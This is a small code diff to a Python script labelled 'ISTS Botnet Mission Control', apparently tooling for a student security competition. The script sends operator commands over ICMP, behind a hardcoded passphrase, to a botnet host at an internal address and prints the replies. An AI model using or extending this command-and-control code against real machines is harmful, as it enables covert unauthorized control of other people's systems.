@@ -10,13 +10,10 @@ def main():
 	print(" - ISTS Botnet Mission Control - ")
     	print("\thelp - to list commands")
 	while True:
-
-   		sys.stdout.write(">>>")
-		cmd = raw_input("")
+		cmd = raw_input(">>>")
 		send_icmp(localhost, "10.80.100.35", "OkayNowYouCanUseMe"+cmd)
 	
-		if not responseQueue.empty():
-			print(responseQueue.get())
+		print(responseQueue.get(True,5))
 				
 if __name__ == "__main__":
     main()
